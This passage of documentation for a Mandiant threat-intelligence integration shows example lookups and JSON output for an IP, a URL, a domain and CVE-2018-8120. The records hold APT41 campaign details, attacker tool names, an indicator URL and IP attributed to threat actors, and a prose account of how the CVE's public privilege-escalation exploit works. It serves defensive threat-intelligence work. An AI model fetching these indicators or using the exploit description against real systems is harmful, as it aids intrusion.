                        "description": "Mandiant Observed Use of The Technique",
                        "event_type": "technique_observed",
                        "mandiant_technique": {
                            "attribution_scope": "confirmed",
                            "id": "attack-pattern--ae0d50d8-79de-5193-9223-178fde2c0756",
                            "name": "Privilege escalation via access token impersonation",
                            "releasable": true,
                            "type": "attack-pattern"
                        },
                        "mitre_techniques": [
                            {
                                "attribution_scope": "confirmed",
                                "id": "attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d",
                                "mitre_id": "T1134.001",
                                "name": "Token Impersonation/Theft",
                                "releasable": true,
                                "tactics": [
                                    "Privilege Escalation",
                                    "Defense Evasion"
                                ],
                                "type": "attack-pattern"
                            },
                            {
                                "attribution_scope": "confirmed",
                                "id": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
                                "mitre_id": "T1134",
                                "name": "Access Token Manipulation",
                                "releasable": true,
                                "tactics": [
                                    "Privilege Escalation",
                                    "Defense Evasion"
                                ],
                                "type": "attack-pattern"
                            }
                        ],
                        "name": "Technique Observed",
                        "releasable": true,
                        "used_by": [
                            {
                                "actor": {
                                    "attribution_scope": "confirmed",
                                    "id": "threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64",
                                    "name": "APT41",
                                    "releasable": true,
                                    "type": "threat-actor"
                                },
                                "first_observed": "2021-05-05T00:00:00.000Z",
                                "last_observed": "2021-10-17T00:00:00.000Z",
                                "releasable": true
                            }
                        ]
                    }
                ],
                "tools": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--8130c516-308e-51e1-b16c-f398d80e67b0",
                        "name": "IMPACKET.PSEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--bf2fc1e5-7850-5ecd-87a7-263e6da5708d",
                        "name": "MIMIKATZ",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--934dcadf-f9a8-52c1-9c90-353a1c3144d5",
                        "name": "PSEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--47530422-6b2d-5329-95c1-fcf7698edeee",
                        "name": "7ZIP",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--f872b3e0-c277-5716-baae-885a9c410398",
                        "name": "WHOAMI",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--e224f74a-ca0e-540b-884f-03753787316f",
                        "name": "NLTEST",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--2db234c8-596a-58f9-a50f-ce24b58965cd",
                        "name": "IMPACKET.SMBEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--0c7945de-0968-55e3-ad4e-1600ddfc6b36",
                        "name": "PROCDUMP",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--fed3481f-0095-53f2-8c32-7e286013233b",
                        "name": "DSQUERY",
                        "releasable": true,
                        "type": "malware"
                    }
                ],
                "type": "campaign",
                "vulnerabilities": [
                    {
                        "attribution_scope": "confirmed",
                        "cve_id": "CVE-2021-44207",
                        "id": "vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0",
                        "releasable": true,
                        "type": "vulnerability"
                    }
                ]
            },
            "relationships": [
                {
                    "entityA": "CAMP.21.014",
                    "entityAFamily": "Indicator",
                    "entityAType": "Campaign",
                    "entityB": "APT41",
                    "entityBFamily": "Indicator",
                    "entityBType": "Threat Actor",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                },
                {
                    "entityA": "CAMP.21.014",
                    "entityAFamily": "Indicator",
                    "entityAType": "Campaign",
                    "entityB": "BEACON",
                    "entityBFamily": "Indicator",
                    "entityBType": "Malware",
                    "fields": {},
                    "name": "related-to",
                    "reverseName": "related-to",
                    "type": "IndicatorToIndicator"
                }
            ],
            "type": "Campaign",
            "value": "CAMP.21.014"
        },
        "IP": [
            {
                "fields": {
                    "DBotScore": {
                        "Indicator": "124.248.207.50",
                        "Reliability": "A - Completely reliable",
                        "Score": 2,
                        "Type": "ip",
                        "Vendor": "Mandiant"
                    },
                    "firstseenbysource": "2016-06-09T16:28:01.000Z",
                    "ip": "124.248.207.50",
                    "lastseenbysource": "2018-04-19T17:23:59.000Z",
                    "stixid": "ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8",
                    "trafficlightprotocol": "AMBER"
                },
                "rawJSON": {
                    "attributed_associations": [
                        {
                            "id": "threat-actor--3790b99d-7067-536c-821d-19953727bf7b",
                            "name": "Turla Team",
                            "type": "threat-actor"
                        }
                    ],
                    "campaigns": [],
                    "first_seen": "2016-06-09T16:28:01.000Z",
                    "id": "ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8",
                    "is_exclusive": false,
                    "is_publishable": true,
                    "last_seen": "2018-04-19T17:23:59.000Z",
                    "last_updated": "2022-05-14T10:15:13.771Z",
                    "mscore": 52,
                    "publications": [],
                    "sources": [
                        {
                            "category": [],
                            "first_seen": "2018-01-08T21:29:53.000+0000",
                            "last_seen": "2018-04-19T17:23:59.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        },
                        {
                            "category": [],
                            "first_seen": "2016-06-09T16:28:01.000+0000",
                            "last_seen": "2016-06-09T16:28:01.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        }
                    ],
                    "type": "ipv4",
                    "value": "124.248.207.50"
                },
                "relationships": [],
                "score": 2,
                "type": "IP",
                "value": "124.248.207.50"
            }
        ]
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| firstseenbysource: 2016-06-09T16:28:01.000Z<br/>lastseenbysource: 2018-04-19T17:23:59.000Z<br/>stixid: ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": "124.248.207.50", "Type": "ip", "Vendor": "Mandiant", "Score": 2, "Reliability": "A - Completely reliable"}<br/>ip: 124.248.207.50 | id: ipv4--3a4d8f76-6fde-5b25-9672-a45a0ac16bc8<br/>mscore: 52<br/>type: ipv4<br/>value: 124.248.207.50<br/>is_exclusive: false<br/>is_publishable: true<br/>sources: {'first_seen': '2018-01-08T21:29:53.000+0000', 'last_seen': '2018-04-19T17:23:59.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'},<br/>{'first_seen': '2016-06-09T16:28:01.000+0000', 'last_seen': '2016-06-09T16:28:01.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'}<br/>attributed_associations: {'id': 'threat-actor--3790b99d-7067-536c-821d-19953727bf7b', 'name': 'Turla Team', 'type': 'threat-actor'}<br/>misp: {"akamai": false, "alexa": false, "alexa_1M": false, "amazon-aws": false, "apple": false, "automated-malware-analysis": false, "bank-website": false, "cisco_1M": false, "cisco_top1000": false, "cisco_top10k": false, "cisco_top20k": false, "cisco_top5k": false, "cloudflare": false, "common-contact-emails": false, "common-ioc-false-positive": false, "covid": false, "covid-19-cyber-threat-coalition-whitelist": false, "covid-19-krassi-whitelist": false, "crl-hostname": false, "crl-ip": false, "dax30": false, "disposable-email": false, "dynamic-dns": false, "eicar.com": false, "empty-hashes": false, "fastly": false, "google": false, "google-gcp": false, "google-gmail-sending-ips": false, "googlebot": false, "ipv6-linklocal": false, "majestic_million": false, "majestic_million_1M": false, "microsoft": false, "microsoft-attack-simulator": false, "microsoft-azure": false, "microsoft-azure-china": false, "microsoft-azure-germany": false, "microsoft-azure-us-gov": false, "microsoft-office365": false, "microsoft-office365-cn": false, "microsoft-office365-ip": false, "microsoft-win10-connection-endpoints": false, "moz-top500": false, "mozilla-CA": false, "mozilla-IntermediateCA": false, "multicast": false, "nioc-filehash": false, "ovh-cluster": false, "phone_numbers": false, "public-dns-hostname": false, "public-dns-v4": false, "public-dns-v6": false, "rfc1918": false, "rfc3849": false, "rfc5735": false, "rfc6598": false, "rfc6761": false, "second-level-tlds": false, "security-provider-blogpost": false, "sinkholes": false, "smtp-receiving-ips": false, "smtp-sending-ips": false, "stackpath": false, "ti-falsepositives": false, "tlds": false, "tranco": false, "tranco10k": false, "university_domains": false, "url-shortener": false, "vpn-ipv4": false, "vpn-ipv6": false, "whats-my-ip": false, "wikimedia": false}<br/>last_updated: 2022-05-14T10:15:13.771Z<br/>first_seen: 2016-06-09T16:28:01.000Z<br/>last_seen: 2018-04-19T17:23:59.000Z<br/>campaigns: <br/>publications:  |  | 2 | IP | 124.248.207.50 |


### url

***
Retrieve information about a URL from Mandiant

#### Base Command

`url`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| url | List of URLs. | Optional | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.URL.score | Number | The Severity Score of the URL indicator | 
| MANDIANTTI.URL.fields.url | String | The URL value for the Domain indicator | 

#### Command example
```!url url=http://67.205.132.162/a.txt```
#### Context Example
```json
{
    "MANDIANTTI": {
        "URL": [
            {
                "fields": {
                    "DBotScore": {
                        "Indicator": "http://67.205.132.162/a.txt",
                        "Reliability": "A - Completely reliable",
                        "Score": 3,
                        "Type": "url",
                        "Vendor": "Mandiant"
                    },
                    "firstseenbysource": "2021-06-14T17:46:19.000Z",
                    "lastseenbysource": "2021-06-14T17:46:41.000Z",
                    "stixid": "url--e5cc1f98-a9db-5e45-88c3-957fec8f274d",
                    "trafficlightprotocol": "AMBER",
                    "url": "http://67.205.132.162/a.txt"
                },
                "rawJSON": {
                    "attributed_associations": [
                        {
                            "id": "threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64",
                            "name": "APT41",
                            "type": "threat-actor"
                        }
                    ],
                    "campaigns": [
                        {
                            "id": "campaign--c344bb9b-cb50-58be-9c33-350b622c1fce",
                            "name": "CAMP.21.014",
                            "title": "APT41 Exploition of .NET Web Applications at U.S. State Governments"
                        }
                    ],
                    "first_seen": "2021-06-14T17:46:19.000Z",
                    "id": "url--e5cc1f98-a9db-5e45-88c3-957fec8f274d",
                    "is_exclusive": true,
                    "is_publishable": true,
                    "last_seen": "2021-06-14T17:46:41.000Z",
                    "last_updated": "2022-10-10T23:04:53.568Z",
                    "mscore": 100,
                    "publications": [],
                    "sources": [
                        {
                            "category": [],
                            "first_seen": "2021-06-14T17:46:19.000+0000",
                            "last_seen": "2021-06-14T17:46:41.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        }
                    ],
                    "type": "url",
                    "value": "http://67.205.132.162/a.txt"
                },
                "relationships": [
                    {
                        "entityA": "http://67.205.132.162/a.txt",
                        "entityAFamily": "Indicator",
                        "entityAType": "URL",
                        "entityB": "CAMP.21.014",
                        "entityBFamily": "Indicator",
                        "entityBType": "Campaign",
                        "fields": {},
                        "name": "related-to",
                        "reverseName": "related-to",
                        "type": "IndicatorToIndicator"
                    }
                ],
                "score": 3,
                "type": "URL",
                "value": "http://67.205.132.162/a.txt"
            }
        ]
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| firstseenbysource: 2021-06-14T17:46:19.000Z<br/>lastseenbysource: 2021-06-14T17:46:41.000Z<br/>stixid: url--e5cc1f98-a9db-5e45-88c3-957fec8f274d<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": "http:<span>//</span>67.205.132.162/a.txt", "Type": "url", "Vendor": "Mandiant", "Score": 3, "Reliability": "A - Completely reliable"}<br/>url: http:<span>//</span>67.205.132.162/a.txt | id: url--e5cc1f98-a9db-5e45-88c3-957fec8f274d<br/>mscore: 100<br/>type: url<br/>value: http:<span>//</span>67.205.132.162/a.txt<br/>is_exclusive: true<br/>is_publishable: true<br/>sources: {'first_seen': '2021-06-14T17:46:19.000+0000', 'last_seen': '2021-06-14T17:46:41.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'}<br/>attributed_associations: {'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'type': 'threat-actor'}<br/>misp: {"akamai": false, "alexa": false, "alexa_1M": false, "amazon-aws": false, "apple": false, "automated-malware-analysis": false, "bank-website": false, "cisco_1M": false, "cisco_top1000": false, "cisco_top10k": false, "cisco_top20k": false, "cisco_top5k": false, "cloudflare": false, "common-contact-emails": false, "common-ioc-false-positive": false, "covid": false, "covid-19-cyber-threat-coalition-whitelist": false, "covid-19-krassi-whitelist": false, "crl-hostname": false, "crl-ip": false, "dax30": false, "disposable-email": false, "dynamic-dns": false, "eicar.com": false, "empty-hashes": false, "fastly": false, "google": false, "google-gcp": false, "google-gmail-sending-ips": false, "googlebot": false, "ipv6-linklocal": false, "majestic_million": false, "majestic_million_1M": false, "microsoft": false, "microsoft-attack-simulator": false, "microsoft-azure": false, "microsoft-azure-china": false, "microsoft-azure-germany": false, "microsoft-azure-us-gov": false, "microsoft-office365": false, "microsoft-office365-cn": false, "microsoft-office365-ip": false, "microsoft-win10-connection-endpoints": false, "moz-top500": false, "mozilla-CA": false, "mozilla-IntermediateCA": false, "multicast": false, "nioc-filehash": false, "ovh-cluster": false, "phone_numbers": false, "public-dns-hostname": false, "public-dns-v4": false, "public-dns-v6": false, "rfc1918": false, "rfc3849": false, "rfc5735": false, "rfc6598": false, "rfc6761": false, "second-level-tlds": false, "security-provider-blogpost": false, "sinkholes": false, "smtp-receiving-ips": false, "smtp-sending-ips": false, "stackpath": false, "tenable-cloud-ipv4": false, "tenable-cloud-ipv6": false, "ti-falsepositives": false, "tlds": false, "tranco": false, "tranco10k": false, "university_domains": false, "url-shortener": false, "vpn-ipv4": true, "vpn-ipv6": false, "whats-my-ip": false, "wikimedia": false}<br/>last_updated: 2022-10-10T23:04:53.568Z<br/>first_seen: 2021-06-14T17:46:19.000Z<br/>last_seen: 2021-06-14T17:46:41.000Z<br/>campaigns: {'id': 'campaign--c344bb9b-cb50-58be-9c33-350b622c1fce', 'name': 'CAMP.21.014', 'title': 'APT41 Exploition of .NET Web Applications at U.S. State Governments'}<br/>publications:  | {'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'http:<span>//</span>67.205.132.162/a.txt', 'entityAFamily': 'Indicator', 'entityAType': 'URL', 'entityB': 'CAMP.21.014', 'entityBFamily': 'Indicator', 'entityBType': 'Campaign', 'fields': {}} | 3 | URL | http:<span>//</span>67.205.132.162/a.txt |


### domain

***
Retrieve information about an FQDN from Mandiant

#### Base Command

`domain`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| domain | List of domains. | Optional | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.DOMAIN.score | Number | The Severity Score of the Domain indicator | 
| MANDIANTTI.DOMAIN.fields.dns | String | The DNS record value for the Domain indicator | 
| MANDIANTTI.DOMAIN.fields.domain | String | The domain name for the Domain indicator | 

#### Command example
```!domain domain=2011.my03.com```
#### Context Example
```json
{
    "MANDIANTTI": {
        "DOMAIN": [
            {
                "fields": {
                    "DBotScore": {
                        "Indicator": "2011.my03.com",
                        "Reliability": "A - Completely reliable",
                        "Score": 0,
                        "Type": "domain",
                        "Vendor": "Mandiant"
                    },
                    "dns": "2011.my03.com",
                    "domain": "2011.my03.com",
                    "firstseenbysource": "2016-06-09T16:28:00.000Z",
                    "lastseenbysource": "2023-01-23T16:52:33.000Z",
                    "stixid": "fqdn--3c525155-bc95-511d-a717-83e50e20aa14",
                    "trafficlightprotocol": "AMBER"
                },
                "rawJSON": {
                    "campaigns": [],
                    "first_seen": "2016-06-09T16:28:00.000Z",
                    "id": "fqdn--3c525155-bc95-511d-a717-83e50e20aa14",
                    "is_publishable": true,
                    "last_seen": "2023-01-23T16:52:33.000Z",
                    "last_updated": "2023-02-20T18:43:42.349Z",
                    "mscore": 50,
                    "publications": [],
                    "sources": [
                        {
                            "category": [],
                            "first_seen": "2023-01-23T16:52:33.000+0000",
                            "last_seen": "2023-01-23T16:52:33.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        },
                        {
                            "category": [],
                            "first_seen": "2016-06-09T16:28:00.000+0000",
                            "last_seen": "2016-06-09T16:28:00.000+0000",
                            "osint": false,
                            "source_name": "Mandiant"
                        }
                    ],
                    "type": "fqdn",
                    "value": "2011.my03.com"
                },
                "relationships": [],
                "score": 0,
                "type": "Domain",
                "value": "2011.my03.com"
            }
        ]
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| firstseenbysource: 2016-06-09T16:28:00.000Z<br/>lastseenbysource: 2023-01-23T16:52:33.000Z<br/>stixid: fqdn--3c525155-bc95-511d-a717-83e50e20aa14<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": "2011.my03.com", "Type": "domain", "Vendor": "Mandiant", "Score": 0, "Reliability": "A - Completely reliable"}<br/>dns: 2011.my03.com<br/>domain: 2011.my03.com | id: fqdn--3c525155-bc95-511d-a717-83e50e20aa14<br/>mscore: 50<br/>type: fqdn<br/>value: 2011.my03.com<br/>is_publishable: true<br/>sources: {'first_seen': '2023-01-23T16:52:33.000+0000', 'last_seen': '2023-01-23T16:52:33.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'},<br/>{'first_seen': '2016-06-09T16:28:00.000+0000', 'last_seen': '2016-06-09T16:28:00.000+0000', 'osint': False, 'category': [], 'source_name': 'Mandiant'}<br/>misp: {"akamai": false, "alexa": false, "alexa_1M": false, "amazon-aws": false, "apple": false, "automated-malware-analysis": false, "bank-website": false, "captive-portals": false, "cisco_1M": true, "cisco_top1000": false, "cisco_top10k": false, "cisco_top20k": false, "cisco_top5k": false, "cloudflare": false, "common-contact-emails": false, "common-ioc-false-positive": false, "covid": false, "covid-19-cyber-threat-coalition-whitelist": false, "covid-19-krassi-whitelist": false, "crl-hostname": false, "crl-ip": false, "dax30": false, "disposable-email": false, "dynamic-dns": false, "eicar.com": false, "empty-hashes": false, "fastly": false, "google": false, "google-chrome-crux-1million": false, "google-gcp": false, "google-gmail-sending-ips": false, "googlebot": false, "ipv6-linklocal": false, "majestic_million": false, "majestic_million_1M": false, "microsoft": false, "microsoft-attack-simulator": false, "microsoft-azure": false, "microsoft-azure-appid": false, "microsoft-azure-china": false, "microsoft-azure-germany": false, "microsoft-azure-us-gov": false, "microsoft-office365": false, "microsoft-office365-cn": false, "microsoft-office365-ip": false, "microsoft-win10-connection-endpoints": false, "moz-top500": false, "mozilla-CA": false, "mozilla-IntermediateCA": false, "multicast": false, "nioc-filehash": false, "ovh-cluster": false, "parking-domain": false, "parking-domain-ns": false, "phone_numbers": false, "public-dns-hostname": false, "public-dns-v4": false, "public-dns-v6": false, "public-ipfs-gateways": false, "rfc1918": false, "rfc3849": false, "rfc5735": false, "rfc6598": false, "rfc6761": false, "second-level-tlds": true, "security-provider-blogpost": false, "sinkholes": false, "smtp-receiving-ips": false, "smtp-sending-ips": false, "stackpath": false, "tenable-cloud-ipv4": false, "tenable-cloud-ipv6": false, "ti-falsepositives": false, "tlds": true, "tranco": true, "tranco10k": false, "university_domains": false, "url-shortener": false, "vpn-ipv4": false, "vpn-ipv6": false, "whats-my-ip": false, "wikimedia": false}<br/>last_updated: 2023-02-20T18:43:42.349Z<br/>first_seen: 2016-06-09T16:28:00.000Z<br/>last_seen: 2023-01-23T16:52:33.000Z<br/>campaigns: <br/>publications:  |  | 0 | Domain | 2011.my03.com |


### cve

***
Retrieve information about a Vulnerability (by CVE) from Mandiant

#### Base Command

`cve`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| cve | List of CVEs. | Optional | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.CVE.score | Number | The Severity Score of the CVE | 
| MANDIANTTI.CVE.id | String | The CVE ID | 
| MANDIANTTI.CVE.fields.cvss | String | The CVSS version of the CVE | 
| MANDIANTTI.CVE.fields.cvssvector | String | The CVSS vector string for the CVE | 
| MANDIANTTI.CVE.fields.cvss2.metric | String | The name of the CVSS metric | 
| MANDIANTTI.CVE.fields.cvss2.values | String | The values of the CVSS metric | 

#### Command example
```!cve cve=CVE-2018-8120```
#### Context Example
```json
{
    "MANDIANTTI": {
        "CVE": [
            {
                "fields": {
                    "DBotScore": {
                        "Indicator": null,
                        "Reliability": "A - Completely reliable",
                        "Score": 0,
                        "Type": "cve",
                        "Vendor": "Mandiant"
                    },
                    "cvss": "v2.0",
                    "cvss2": [
                        {
                            "metric": "Access Complexity",
                            "values": "MEDIUM"
                        },
                        {
                            "metric": "Access Vector",
                            "values": "LOCAL"
                        },
                        {
                            "metric": "Authentication",
                            "values": "NONE"
                        },
                        {
                            "metric": "Availability Impact",
                            "values": "COMPLETE"
                        },
                        {
                            "metric": "Base Score",
                            "values": 6.9
                        },
                        {
                            "metric": "Confidentiality Impact",
                            "values": "COMPLETE"
                        },
                        {
                            "metric": "Exploitability",
                            "values": "FUNCTIONAL"
                        },
                        {
                            "metric": "Integrity Impact",
                            "values": "COMPLETE"
                        },
                        {
                            "metric": "Remediation Level",
                            "values": "OFFICIAL_FIX"
                        },
                        {
                            "metric": "Report Confidence",
                            "values": "CONFIRMED"
                        },
                        {
                            "metric": "Temporal Score",
                            "values": 5.7
                        },
                        {
                            "metric": "Vector String",
                            "values": "AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C"
                        }
                    ],
                    "cvssvector": "AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C",
                    "id": null,
                    "stixid": "vulnerability--6dc0a4db-e822-5c76-bca2-b7eb750da2ad",
                    "trafficlightprotocol": "AMBER"
                },
                "rawJSON": {
                    "affects_ot": false,
                    "aliases": [],
                    "analysis": "<p>An attacker could exploit this vulnerability to execute arbitrary code. An attacker would need to gain low privilege access to the vulnerable system to exploit this issue. Further, upon obtaining the low privilege access, an attacker would need to craft a program which can change the privilege of the current process, using the call gate functions. A failed attempt at exploitation could potentially cause a crash of the application, resulting in a denial-of-service condition.</p>\n<p>&nbsp;</p>\n<p>A non-weaponized exploit is publicly available on VirusTotal, in the form of a PDF sample. This exploit code creates a new windowstation object and assigns it to the current process in user-mode, making the spklList Pointer field equal to zero. This code writes an arbitrary address in the kernel space by mapping the NULL page and setting a pointer to offset 0x2C. Upon writing an arbitrary address, the attacker changes the privilege level of a process by setting call gate to Ring 0. Further, the exploit uses the CALL FAR instruction to perform an inter-privilege level call, giving an attacker administrative access on the system. A similar exploit code is also publicly available via GitHub.</p>\n<p>&nbsp;</p>\n<p>An exploit code in the form of a Metasploit module has been publicly released. This exploit can trigger the null pointer dereference issue which is caused when the Win32k component does not properly handle objects in memory. Successful exploitation via this code will allow an attacker to perform privileged tasks on the compromised machine.</p>\n<p>&nbsp;</p>\n<p>Microsoft has reported this vulnerability has been exploited. Additionally, it is reported that threat actor ScarCruft is utilizing the publicly available exploit code to drop a backdoor, known as ROKRAT, used for data exfiltration. FireEye tracks most elements of the group publicly reported as Scarcruft as APT37 (Reaper).</p>\n<p>&nbsp;</p>\n<p>Trend Micro has reported observation of a malverstising campaign at the end of October 2019 using an exploit kit they refer to as Capesand to deliver DarkRAT and njRAT malware. This vulnerability was reportedly leveraged after successful exploitation via Capesand in order to gain escalated privileges and execute njcrypt.exe.</p>\n<p>&nbsp;</p>\n<p>No workaround is available, although the Microsoft reportedly addressed this vulnerability in a fix. FireEye iSIGHT Intelligence considers this a Medium-risk vulnerability because of possibility of arbitrary code execution offset by the local access required.</p>\n<p><br />CISA added this vulnerability to its Known Exploited Vulnerabilities Catalog on March 15, 2022, with a required remediation date of April 5, 2022.</p>",
                    "associated_actors": [
                        {
                            "aliases": [
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "Odinaff (Symantec)"
                                },
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "Sectoj04 (NSHC Group)"
                                },
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "TA505 (Proofpoint)"
                                },
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "TEMP.Warlock"
                                },
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "Ta505 (Norfolkinfosec)"
                                },
                                {
                                    "attribution_scope": "confirmed",
                                    "name": "Ta505 (Trend Micro)"
                                }
                            ],
                            "country_code": "unknown",
                            "description": "FIN11 is a financially motivated threat group that has conducted some of the largest and longest running malware distribution campaigns observed amongst our FIN groups to date. Mandiant has observed FIN11 attempt to monetize their operations at least once using named point-of-sale (POS) malware, and more recently using CLOP ransomware and/or data theft extortion. The volume of FIN11's high-volume spam campaigns slowed in 2021, before ceasing altogether in 2022, when the group shifted to server exploitation for initial access. The group has been active since at least 2016, but identified overlaps with activity tracked by security researchers as TA505 suggest they may have been conducting operations as early as 2014.",
                            "id": "threat-actor--b8ee8129-5ecc-581a-a636-fb17051d2ffe",
                            "intel_free": false,
                            "last_updated": "2023-03-04T07:03:58Z",
                            "name": "FIN11"
                        }
                    ],
                    "associated_malware": [
                        {
                            "aliases": [],
                            "description": "BADPOTATO is a publicly available privilege escalation tool that abuses Impersonation Privileges on Windows 10 and Windows Server 2019. ",
                            "has_yara": true,
                            "id": "malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3",
                            "intel_free": false,
                            "is_malicious": true,
                            "last_updated": "2023-03-06T02:10:40.000Z",
                            "name": "BADPOTATO"
                        },
                        {
                            "aliases": [],
                            "description": "COMAHAWK is a privilege escalation tool that attempts to exploit CVE-2019-1405 and CVE-2019-1322.",
                            "has_yara": true,
                            "id": "malware--0073c12d-177a-5353-8170-e72ac8fc75bb",
                            "intel_free": false,
                            "is_malicious": true,
                            "last_updated": "2023-03-06T02:13:12.000Z",
                            "name": "COMAHAWK"
                        }
                    ],
                    "associated_reports": [
                        {
                            "audience": [
                                "vulnerability"
                            ],
                            "published_date": "2018-05-08T23:36:07.596Z",
                            "report_id": "18-00007543",
                            "report_type": "Patch Report",
                            "title": "Microsoft May 2018 Security Advisory Release"
                        },
                        {
                            "audience": [
                                "vulnerability"
                            ],
                            "published_date": "2019-06-12T13:15:13.875Z",
                            "report_id": "19-00009557",
                            "report_type": "Trends and Forecasting",
                            "title": "May 2019 Month in Vulnerabilities"
                        },
                        {
                            "audience": [
                                "strategic",
                                "vulnerability"
                            ],
                            "published_date": "2019-12-18T13:16:56.301Z",
                            "report_id": "19-00021769",
                            "report_type": "Trends and Forecasting",
                            "title": "Analysis of Time to Exploit in Tracked Vulnerabilities Exploited in 2018\u20132019"
                        },
                        {
                            "audience": [
                                "cyber crime",
                                "fusion"
                            ],
                            "published_date": "2018-10-19T20:32:50.054Z",
                            "report_id": "18-00017419",
                            "report_type": "Trends and Forecasting",
                            "title": "Operational Net Assessment of Cyber Crime Threats\u00e2July to September 2018"
                        },
                        {
                            "audience": [
                                "vulnerability"
                            ],
                            "published_date": "2018-06-18T23:04:39.328Z",
                            "report_id": "18-00009795",
                            "report_type": "Vulnerability Report",
                            "title": "May 2018 Month in Vulnerabilities"
                        },
                        {
                            "audience": [
                                "cyber crime",
                                "fusion",
                                "vulnerability"
                            ],
                            "published_date": "2018-06-28T18:46:09.706Z",
                            "report_id": "18-00010584",
                            "report_type": "Threat Activity Alert",
                            "title": "Threat Activity Alert: Russian-Speaking Actor Advertises a Malicious PDF Builder with CVE-2018-4990 and CVE-2018-8120 Exploits"
                        },
                        {
                            "audience": [
                                "cyber crime",
                                "fusion"
                            ],
                            "published_date": "2019-02-05T22:02:15.475Z",
                            "report_id": "19-00002007",
                            "report_type": "Actor Profile",
                            "title": "Threat Actor Profile: GandCrab "
                        },
                        {
                            "audience": [
                                "cyber crime",
                                "fusion"
                            ],
                            "published_date": "2018-10-16T18:37:46.427Z",
                            "report_id": "18-00017293",
                            "report_type": "Trends and Forecasting",
                            "title": "Monthly Report on Cyber Crime Threats to the Financial Sector \u2013 September 2018"
                        },
                        {
                            "audience": [
                                "vulnerability"
                            ],
                            "published_date": "2022-04-05T14:17:42.242Z",
                            "report_id": "18-00007690",
                            "report_type": "Vulnerability Report",
                            "title": "Microsoft Windows Server 2008 NtUserSetImeInfoEx() Null Pointer Dereference Vulnerability"
                        },
                        {
                            "audience": [
                                "cyber crime",
                                "operational"
                            ],
                            "published_date": "2019-12-16T19:20:00.473Z",
                            "report_id": "18-00003542",
                            "report_type": "Malware Profile",
                            "title": "GandCrab Ransomware Malware Profile"
                        }
                    ],
                    "audience": [
                        "intel_vuln"
                    ],
                    "available_mitigation": [
                        "Patch"
                    ],
                    "cisa_known_exploited": null,
                    "common_vulnerability_scores": {
                        "v2.0": {
                            "access_complexity": "MEDIUM",
                            "access_vector": "LOCAL",
                            "authentication": "NONE",
                            "availability_impact": "COMPLETE",
                            "base_score": 6.9,
                            "confidentiality_impact": "COMPLETE",
                            "exploitability": "FUNCTIONAL",
                            "integrity_impact": "COMPLETE",
                            "remediation_level": "OFFICIAL_FIX",
                            "report_confidence": "CONFIRMED",
                            "temporal_score": 5.7,
                            "vector_string": "AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C"
                        },
                        "v3.0": {
                            "attack_complexity": "HIGH",
                            "attack_vector": "LOCAL",
                            "availability_impact": "HIGH",
                            "base_score": 7,
                            "confidentiality_impact": "HIGH",
                            "exploit_code_maturity": "FUNCTIONAL",
                            "integrity_impact": "HIGH",
                            "privileges_required": "LOW",
                            "remediation_level": "OFFICIAL_FIX",
                            "report_confidence": "CONFIRMED",
